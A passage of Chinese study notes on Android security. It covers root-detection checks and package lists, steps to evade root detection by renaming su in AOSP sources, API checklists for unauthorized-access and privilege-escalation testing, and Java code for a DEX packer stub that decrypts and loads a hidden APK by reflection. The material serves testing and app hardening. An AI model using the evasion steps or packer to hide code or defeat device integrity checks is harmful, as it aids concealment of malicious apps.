是test-keys（测试版），还是release-keys（发布版)，去获取ro.debuggable、ro.secure的值检测是否有调试状态</p><p>root检测指纹</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>.detectRootManagementApps—检测常见su包名,如&#123;“com<span class="hljs-selector-class">.noshufou</span><span class="hljs-selector-class">.android</span>.su”, “com<span class="hljs-selector-class">.noshufou</span><span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.su</span>.elite”, “eu<span class="hljs-selector-class">.chainfire</span>.supersu”, “com<span class="hljs-selector-class">.koushikdutta</span>.superuser”, “com<span class="hljs-selector-class">.thirdparty</span>.superuser”, “com<span class="hljs-selector-class">.yellowes</span>.su”, “com<span class="hljs-selector-class">.topjohnwu</span>.magisk”, “com<span class="hljs-selector-class">.kingroot</span>.kinguser”, “com<span class="hljs-selector-class">.kingo</span>.root”, “com<span class="hljs-selector-class">.smedialink</span>.oneclickroot”, “com<span class="hljs-selector-class">.zhiqupk</span><span class="hljs-selector-class">.root</span>.global”, “com<span class="hljs-selector-class">.alephzain</span>.framaroot”&#125;<br><br><span class="hljs-number">2</span>.detectPotentiallyDangerousApps—&#123;“com<span class="hljs-selector-class">.koushikdutta</span>.rommanager”, “com<span class="hljs-selector-class">.koushikdutta</span><span class="hljs-selector-class">.rommanager</span>.license”, “com<span class="hljs-selector-class">.dimonvideo</span>.luckypatcher”, “com<span class="hljs-selector-class">.chelpus</span>.lackypatch”, “com<span class="hljs-selector-class">.ramdroid</span>.appquarantine”, “com<span class="hljs-selector-class">.ramdroid</span>.appquarantinepro”, “com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.vending</span><span class="hljs-selector-class">.billing</span><span class="hljs-selector-class">.InAppBillingService</span>.COIN”, “com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.vending</span><span class="hljs-selector-class">.billing</span><span class="hljs-selector-class">.InAppBillingService</span>.LUCK”, “com<span class="hljs-selector-class">.chelpus</span>.luckypatcher”, “com.blackmartalpha”, “org<span class="hljs-selector-class">.blackmart</span>.market”, “com<span class="hljs-selector-class">.allinone</span>.free”, “com<span class="hljs-selector-class">.repodroid</span>.app”, “org<span class="hljs-selector-class">.creeplays</span>.hack”, “com<span class="hljs-selector-class">.baseappfull</span>.fwd”, “com.zmapp”, “com<span class="hljs-selector-class">.dv</span><span class="hljs-selector-class">.marketmod</span>.installer”, “org<span class="hljs-selector-class">.mobilism</span>.android”, “com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.wp</span><span class="hljs-selector-class">.net</span>.log”, “com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.camera</span>.update”, “cc<span class="hljs-selector-class">.madkite</span>.freedom”, “com<span class="hljs-selector-class">.solohsu</span><span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.edxp</span>.manager”, “org<span class="hljs-selector-class">.meowcat</span><span class="hljs-selector-class">.edxposed</span>.manager”, “com.xmodgame”, “com<span class="hljs-selector-class">.cih</span>.game_cih”, “com<span class="hljs-selector-class">.charles</span>.lpoqasert”, “catch_<span class="hljs-selector-class">.me_</span><span class="hljs-selector-class">.if_</span><span class="hljs-selector-class">.you_</span>.can_”&#125;<br><br><span class="hljs-number">3</span>.detectRootCloakingApps—&#123;“com<span class="hljs-selector-class">.devadvance</span>.rootcloak”, “com<span class="hljs-selector-class">.devadvance</span>.rootcloakplus”, “de<span class="hljs-selector-class">.robv</span><span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.xposed</span>.installer”, “com<span class="hljs-selector-class">.saurik</span>.substrate”, “com<span class="hljs-selector-class">.zachspong</span>.temprootremovejb”, “com<span class="hljs-selector-class">.amphoras</span>.hidemyroot”, “com<span class="hljs-selector-class">.amphoras</span>.hidemyrootadfree”, “com<span class="hljs-selector-class">.formyhm</span>.hiderootPremium”, “com<span class="hljs-selector-class">.formyhm</span>.hideroot”&#125;<br><br><span class="hljs-number">4</span>.suPath—遍历执行可能存在的su文件夹,如&#123;“/data/local/”, “/data/local/bin/”, “/data/local/xbin/”, “/sbin/”, “/su/bin/”, “/system/bin/”, “/system/bin/.ext/”, “/system/bin/failsafe/”, “/system/sd/xbin/”, “/system/usr/we-need-root/”, “/system/xbin/”, “/cache/”, “/data/”, “/dev/”&#125;<br><br><span class="hljs-number">5</span>.checkForDangerousProps—检查一些属性的值.&#123;ro.debuggable”, “<span class="hljs-number">1</span>”&#125;,&#123;“ro.secure”, “<span class="hljs-number">0</span>”&#125;<br><br><span class="hljs-number">6</span>.checkForRWPaths—先执行(需要root)mount如果返回true然后再查看是否有读写权限&#123;“/system”, “/system/bin”, “/system/sbin”, “/system/xbin”, “/vendor/bin”, “/sbin”, “/etc”&#125;<br><br><span class="hljs-number">7</span>.detectTestKeys—查看编译类型是否为 &#123;“test-keys”&#125;<br><br><span class="hljs-number">8</span>.checkBuildProp—检查Buildprop的值,&#123;“ro<span class="hljs-selector-class">.build</span><span class="hljs-selector-class">.display</span>.id”,”ro<span class="hljs-selector-class">.build</span><span class="hljs-selector-class">.version</span>.incremental”,”ro<span class="hljs-selector-class">.build</span>.date”,”ro<span class="hljs-selector-class">.build</span><span class="hljs-selector-class">.date</span>.utc”,”ro<span class="hljs-selector-class">.build</span>.type”,”ro<span class="hljs-selector-class">.build</span>.user”,”ro<span class="hljs-selector-class">.build</span>.flavor”,”ro<span class="hljs-selector-class">.build</span>.tags”,”ro<span class="hljs-selector-class">.build</span>.description”,”ro<span class="hljs-selector-class">.build</span>.fingerprint”,”ro<span class="hljs-selector-class">.product</span>.model”,”ro<span class="hljs-selector-class">.product</span>.brand”,”ro<span class="hljs-selector-class">.product</span>.name”&#125;<br><br><span class="hljs-number">9</span>.checkSuExists—执行su,看看能否执行成功<br><br><span class="hljs-number">10</span>.checkForRootNative—Native层root检查<br><br><span class="hljs-number">11</span>.checkForMagiskBinary—检测是否存在Magisk-&#123;“/data/local/”, “/data/local/bin/”, “/data/local/xbin/”, “/sbin/”, “/su/bin/”, “/system/bin/”, “/system/bin/.ext/”, “/system/bin/failsafe/”, “/system/sd/xbin/”, “/system/usr/we-need-root/”, “/system/xbin/”, “/cache/”, “/data/”, “/dev/”&#125;<br></code></pre></td></tr></table></figure><p>绕过</p><ul><li>在&#x2F;system&#x2F;extras&#x2F;su&#x2F;Android.mk中修改su为需要的名称</li><li>&#x2F;system&#x2F;core&#x2F;libcutils&#x2F;fs_config.cpp中&#x2F;system&#x2F;xbin&#x2F;su修改为&#x2F;system&#x2F;xbin&#x2F;修改的名称</li><li>&#x2F;system&#x2F;sepolicy&#x2F;private&#x2F;file_contexts中&#x2F;system&#x2F;xbin&#x2F;su修改为&#x2F;system&#x2F;xbin&#x2F;修改的名称</li><li>修改特征</li><li>直接赋予adb为root权限</li></ul><p>app启动流程</p><p>startActivity&#x2F;startservice——–process.start———-zygotelinit runselectloop——–ActivityThread.main</p><h5 id="未授权访问测试"><a href="#未授权访问测试" class="headerlink" title="未授权访问测试"></a>未授权访问测试</h5><p>指用户在没有通过认证授权的情况下能够直接访问需要通过认证才能访问的页面或者信息：</p><ul><li>统计测试接口</li><li>使用抓包工具获得接口入参</li><li>不填写cookie或者填写无效cookie重新请求；</li><li>查看·请求结果，如果返回了正确cookie才能获取的结果，说明该接口存在未授权访问漏洞</li></ul><ul><li></li></ul><h5 id="越权访问测试"><a href="#越权访问测试" class="headerlink" title="越权访问测试"></a>越权访问测试</h5><p>通过抓包修改参数的方式绕过客户端实施攻击，从而测试师傅存在越权访问漏洞。</p><ul><li>统计测试接口；</li><li>使用抓包工具获取接口入参；</li><li>水平越权测试：分析入参中师傅标识用户身份的敏感信息，绕过存在，则修改为气她测试用户信息，重新请求查看返回结果，若返回结果正确，则该接口存在水平越权漏洞</li><li>垂直越权测试：分析高级权限用户的请求入参，将高权限用户信息替换为低级权限用户的信息，重新请求查看返回结果，若返回结果正确，则该接口存在垂直越权漏洞。</li></ul><h5 id="第一代壳：DEX加密（落地加载）"><a href="#第一代壳：DEX加密（落地加载）" class="headerlink" title="第一代壳：DEX加密（落地加载）"></a>第一代壳：DEX加密（落地加载）</h5><p><img src="image-20240303181212519.png" alt="image-20240303181212519"></p><p>我们在加固的过程中需要三个对象：</p><p>1、需要加密的Apk(源Apk)</p><p>2、壳程序Apk(负责解密Apk工作)</p><p>3、加密工具(将源Apk进行加密和壳Dex合并成新的Dex)</p><p>需要加密的Apk和自己的壳程序Apk，然后用加密算法对源Apk进行加密在将壳Apk进行合并得到新的Dex文件，最后替换壳程序中的dex文件即可</p><p>重要的三个部分</p><ul><li>checksum：文件效验码，使用alder32算法校验文件除去magic，checksum外余下的所以文件区域，用于检查文件错误。</li><li>signature：使用SHA-1算法hash除去magic，checksum和signature外余下的所以文件区域，用于2唯一识别文本。</li><li>file_size：Dex文件的大小</li></ul><p>需要将一个文件(加密之后的源Apk)写入到Dex中，修改Dex的三个文件头，将源Apk的大小追加到壳dex的末尾</p><p><img src="informatin/book/笔记/image-20240303204739917.png" alt="image-20240303204739917"></p><p>apkUnshell.app</p><p>第一段可以理解为初始化和动态环境配置，定义了相关变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SuppressWarnings(&quot;rawtypes&quot;)</span> <span class="hljs-comment">// 忽略未经检查的操作警告，比如使用了原生类型</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attachBaseContext</span><span class="hljs-params">(Context base)</span> &#123;<br>    <span class="hljs-built_in">super</span>.attachBaseContext(base); <span class="hljs-comment">// 调用父类的attachBaseContext方法，设置上下文环境</span><br>    context = base; <span class="hljs-comment">// 保存传入的上下文对象到成员变量</span><br>    Log.e(TAG,<span class="hljs-string">&quot;attachBaseContext&quot;</span>); <span class="hljs-comment">// 使用日志记录方法调用，用于调试</span><br><br>    <br>    <br>    <span class="hljs-comment">// 下面代码块主要进行文件路径的准备和设置</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 创建私有目录用于存放优化后的DEX文件 PAYLOAD_ODEX等为定义</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">odexPathFile</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getDir(PAYLOAD_ODEX, MODE_PRIVATE);<br>        <span class="hljs-comment">// 创建私有目录用于存放加载的本地库文件（.so）</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">libsPathFile</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getDir(PAYLOAD_LIB, MODE_PRIVATE);<br>        <span class="hljs-comment">// 保存这些路径到成员变量中用于后续操作</span><br>        odexPath = odexPathFile.getAbsolutePath();<br>        libPath = libsPathFile.getAbsolutePath();<br>        srcDexFilePath = odexPathFile.getAbsolutePath() + <span class="hljs-string">&quot;/&quot;</span> + DEXFILENAME;<br><br>        <span class="hljs-comment">// 上面注释掉的代码块似乎是用于从Assets目录中提取文件的代码，</span><br>        <span class="hljs-comment">// 但在这段代码中并没有被使用</span><br>        <span class="hljs-comment">// 根据路径创建源DEX文件</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">srcDexFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(srcDexFilePath);<br>        <span class="hljs-comment">// 如果是第一次加载，说明dex文件尚未解密释放，所以需要进行这步操作</span><br>        <span class="hljs-keyword">if</span> (!srcDexFile.exists()) &#123;<br>            Log.e(TAG, <span class="hljs-string">&quot;beFirstLoading&quot;</span>);<br><br>            <span class="hljs-comment">// 创建新的dex文件</span><br>            srcDexFile.createNewFile();<br>            <span class="hljs-comment">// 从apk中读取dex文件</span><br>            <span class="hljs-type">byte</span>[] dexdata = <span class="hljs-built_in">this</span>.readDexFileFromApk();<br>            <span class="hljs-comment">// 从dex文件中提取出源apk资源，进行解密，存放到之前创建的文件目录中</span><br>            <span class="hljs-built_in">this</span>.splitPayLoadFromDex(dexdata);<br>        &#125;<br><br>        <br>        <br>        <br>        <br>        <br>        <span class="hljs-comment">// 下面代码块主要进行动态加载环境的配置</span><br>        <span class="hljs-comment">// 反射获取当前的ActivityThread对象</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">currentActivityThread</span> <span class="hljs-operator">=</span> RefInvoke.invokeStaticMethod(<br>            <span class="hljs-string">&quot;android.app.ActivityThread&quot;</span>, <span class="hljs-string">&quot;currentActivityThread&quot;</span>,<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;&#125;<br>        );<br>        <span class="hljs-comment">// 获取ActivityThread中的mPackages成员变量，它保存了所有已加载的包信息</span><br>        <span class="hljs-type">ArrayMap</span> <span class="hljs-variable">mPackages</span> <span class="hljs-operator">=</span> (ArrayMap) RefInvoke.getFieldOjbect(<br>            <span class="hljs-string">&quot;android.app.ActivityThread&quot;</span>, currentActivityThread, <span class="hljs-string">&quot;mPackages&quot;</span><br>        );<br>        <span class="hljs-comment">// 获取当前应用的包名</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">packageName</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getPackageName();<br>        <span class="hljs-comment">// 根据包名找到当前应用的LoadedApk的弱引用</span><br>        <span class="hljs-type">WeakReference</span> <span class="hljs-variable">wr</span> <span class="hljs-operator">=</span> (WeakReference) mPackages.get(packageName);<br>        <span class="hljs-comment">// 使用源apk的DexClassLoader替换掉当前的ClassLoader</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">fathercl</span> <span class="hljs-operator">=</span> (ClassLoader) RefInvoke.getFieldOjbect(<br>            <span class="hljs-string">&quot;android.app.LoadedApk&quot;</span>, wr.get(), <span class="hljs-string">&quot;mClassLoader&quot;</span><br>        );<br>        <span class="hljs-comment">// 创建新的DexClassLoader实例，指定dex路径、解压路径、库文件路径和父ClassLoader</span><br>        <span class="hljs-type">DexClassLoader</span> <span class="hljs-variable">dLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DexClassLoader</span>(<br>            srcDexFilePath, odexPath, libPath, fathercl<br>        );<br>        <span class="hljs-comment">// 用新的DexClassLoader实例替换LoadedApk中的mClassLoader字段</span><br>        RefInvoke.setFieldOjbect(<br>            <span class="hljs-string">&quot;android.app.LoadedApk&quot;</span>, <span class="hljs-string">&quot;mClassLoader&quot;</span>, wr.get(), dLoader<br>        );<br>        <span class="hljs-comment">// 以下是调试代码，用于验证类是否成功加载</span><br>        <span class="hljs-comment">// Object actObj = dLoader.loadClass(LOADCLASSNAME);</span><br>        <span class="hljs-comment">// Log.e(TAG, &quot;get class object:&quot; + actObj);</span><br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-comment">// 如果有异常发生，记录堆栈信息用于调试</span><br>        Log.e(TAG, <span class="hljs-string">&quot;error:&quot;</span>+Log.getStackTraceString(e));<br>        e.printStackTrace();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这段代码通过动态加载和反射替换了应用的<code>Application</code>实例，以此来加载被加固保护的原始代码和资源，使得原始APK的<code>Application</code>能够被实际使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SuppressWarnings(&quot;rawtypes&quot;)</span>  <span class="hljs-comment">// 注解可以用来抑制不同类型的警告</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">try</span> &#123;<br>          Log.e(TAG, <span class="hljs-string">&quot;onCreate&quot;</span>);<br><br>          Log.e(TAG,<span class="hljs-string">&quot;Application:&quot;</span> + context + <span class="hljs-string">&quot;,BaseContext:&quot;</span> + getBaseContext() + <span class="hljs-string">&quot;,ApplicationContext:&quot;</span> + getApplicationContext() + <span class="hljs-string">&quot;,Activity:&quot;</span> + <span class="hljs-built_in">this</span>);<br><br>          <span class="hljs-keyword">if</span>(context == <span class="hljs-literal">null</span>)&#123;<br>              context = <span class="hljs-built_in">this</span>;<br>              <span class="hljs-keyword">if</span>(context == <span class="hljs-literal">null</span>)&#123;<br>                  context = Utils.getContext();<br>              &#125;<br>          &#125;<br><br>          <span class="hljs-comment">//加载源apk资源</span><br>          loadResources(srcDexFilePath);<br><br>          <span class="hljs-comment">//获取配置在清单文件的源Apk的Application路径</span><br>          <span class="hljs-type">String</span> <span class="hljs-variable">appClassName</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>          <span class="hljs-keyword">try</span> &#123;<br>              <span class="hljs-type">ApplicationInfo</span> <span class="hljs-variable">ai</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getPackageManager().getApplicationInfo(<span class="hljs-built_in">this</span>.getPackageName(),PackageManager.GET_META_DATA);<br>              <span class="hljs-type">Bundle</span> <span class="hljs-variable">bundle</span> <span class="hljs-operator">=</span> ai.metaData;<br>              <span class="hljs-keyword">if</span> (bundle != <span class="hljs-literal">null</span> &amp;&amp; bundle.containsKey(appkey)) &#123;<br>                  appClassName = bundle.getString(appkey);<span class="hljs-comment">//className 是配置在xml文件中的</span><br>              &#125;<span class="hljs-keyword">else</span> &#123;<br>                  Log.e(TAG, <span class="hljs-string">&quot;not found class name of application in bundle&quot;</span>);<br>                  <span class="hljs-keyword">return</span>;<br>              &#125;<br>          &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>              Log.e(TAG, <span class="hljs-string">&quot;error:&quot;</span>+Log.getStackTraceString(e));<br>              e.printStackTrace();<br>              <span class="hljs-keyword">return</span>;<br>          &#125;<br><br>          <span class="hljs-comment">//获取当前壳Apk的ApplicationInfo</span><br>          <span class="hljs-type">Object</span> <span class="hljs-variable">currentActivityThread</span> <span class="hljs-operator">=</span> RefInvoke.invokeStaticMethod(<span class="hljs-string">&quot;android.app.ActivityThread&quot;</span>, <span class="hljs-string">&quot;currentActivityThread&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;&#125;);<br><br>          <span class="hljs-type">Object</span> <span class="hljs-variable">mBoundApplication</span> <span class="hljs-operator">=</span> RefInvoke.getFieldOjbect(<span class="hljs-string">&quot;android.app.ActivityThread&quot;</span>, currentActivityThread,<span class="hljs-string">&quot;mBoundApplication&quot;</span>);<br><br>          <span class="hljs-type">Object</span> <span class="hljs-variable">loadedApkInfo</span> <span class="hljs-operator">=</span> RefInvoke.getFieldOjbect(<span class="hljs-string">&quot;android.app.ActivityThread$AppBindData&quot;</span>,mBoundApplication, <span class="hljs-string">&quot;info&quot;</span>);<br><br>          <span class="hljs-comment">//将LoadedApk中的ApplicationInfo设置为null</span><br>          RefInvoke.setFieldOjbect(<span class="hljs-string">&quot;android.app.LoadedApk&quot;</span>, <span class="hljs-string">&quot;mApplication&quot;</span>,loadedApkInfo, <span class="hljs-literal">null</span>);<br><br>          <span class="hljs-comment">//获取currentActivityThread中注册的Application</span><br>          <span class="hljs-type">Object</span> <span class="hljs-variable">oldApplication</span> <span class="hljs-operator">=</span> RefInvoke.getFieldOjbect(<span class="hljs-string">&quot;android.app.ActivityThread&quot;</span>, currentActivityThread,<span class="hljs-string">&quot;mInitialApplication&quot;</span>);<br><br>          <span class="hljs-comment">//获取ActivityThread中所有已注册的Application，并将当前壳Apk的Application从中移除</span><br>          <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>          ArrayList&lt;Application&gt; mAllApplications = (ArrayList&lt;Application&gt;) RefInvoke.getFieldOjbect(<span class="hljs-string">&quot;android.app.ActivityThread&quot;</span>, currentActivityThread, <span class="hljs-string">&quot;mAllApplications&quot;</span>);<br>          mAllApplications.remove(oldApplication);<br><br>          <span class="hljs-type">ApplicationInfo</span> <span class="hljs-variable">appinfo_In_LoadedApk</span> <span class="hljs-operator">=</span> (ApplicationInfo) RefInvoke.getFieldOjbect(<span class="hljs-string">&quot;android.app.LoadedApk&quot;</span>, loadedApkInfo,<span class="hljs-string">&quot;mApplicationInfo&quot;</span>);<br><br>          <span class="hljs-type">ApplicationInfo</span> <span class="hljs-variable">appinfo_In_AppBindData</span> <span class="hljs-operator">=</span> (ApplicationInfo) RefInvoke.getFieldOjbect(<span class="hljs-string">&quot;android.app.ActivityThread$AppBindData&quot;</span>,mBoundApplication, <span class="hljs-string">&quot;appInfo&quot;</span>);<br><br>          <span class="hljs-comment">//替换原来的Application</span><br>          appinfo_In_LoadedApk.className = appClassName;<br>          appinfo_In_AppBindData.className = appClassName;<br><br>          <span class="hljs-comment">//注册Application</span><br>          <span class="hljs-type">Application</span> <span class="hljs-variable">app</span> <span class="hljs-operator">=</span> (Application) RefInvoke.invokeMethod(<span class="hljs-string">&quot;android.app.LoadedApk&quot;</span>, <span class="hljs-string">&quot;makeApplication&quot;</span>,<br>                  loadedApkInfo,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; <span class="hljs-type">boolean</span>.class, Instrumentation.class &#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">false</span>, <span class="hljs-literal">null</span> &#125;);<br><br>          <span class="hljs-comment">//替换ActivityThread中的Application</span><br>          RefInvoke.setFieldOjbect(<span class="hljs-string">&quot;android.app.ActivityThread&quot;</span>,<span class="hljs-string">&quot;mInitialApplication&quot;</span>, currentActivityThread, app);<br><br>          <span class="hljs-type">ArrayMap</span> <span class="hljs-variable">mProviderMap</span> <span class="hljs-operator">=</span> (ArrayMap) RefInvoke.getFieldOjbect(<span class="hljs-string">&quot;android.app.ActivityThread&quot;</span>, currentActivityThread,<span class="hljs-string">&quot;mProviderMap&quot;</span>);<br>          <span class="hljs-type">Iterator</span> <span class="hljs-variable">it</span> <span class="hljs-operator">=</span> mProviderMap.values().iterator();<br>          <span class="hljs-keyword">while</span> (it.hasNext()) &#123;<br>              <span class="hljs-type">Object</span> <span class="hljs-variable">providerClientRecord</span> <span class="hljs-operator">=</span> it.next();<br>              <span class="hljs-type">Object</span> <span class="hljs-variable">localProvider</span> <span class="hljs-operator">=</span> RefInvoke.getFieldOjbect(<span class="hljs-string">&quot;android.app.ActivityThread$ProviderClientRecord&quot;</span>, providerClientRecord, <span class="hljs-string">&quot;mLocalProvider&quot;</span>);<br>              RefInvoke.setFieldOjbect(<span class="hljs-string">&quot;android.content.ContentProvider&quot;</span>, <span class="hljs-string">&quot;mContext&quot;</span>, localProvider, app);<br>          &#125;<br><br>          app.onCreate();<br><br>          Log.e(TAG, <span class="hljs-string">&quot;app:&quot;</span>+app);<br><br>      &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>          e.printStackTrace();<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>提取源dex</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">splitPayLoadFromDex</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] shelldexdata)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>       <span class="hljs-comment">//取被加壳apk的长度</span><br>       <span class="hljs-type">int</span> <span class="hljs-variable">sdlen</span> <span class="hljs-operator">=</span> shelldexdata.length;<br>       <span class="hljs-type">byte</span>[] bytedexlen = <span class="hljs-keyword">new</span> <span class="hljs-title 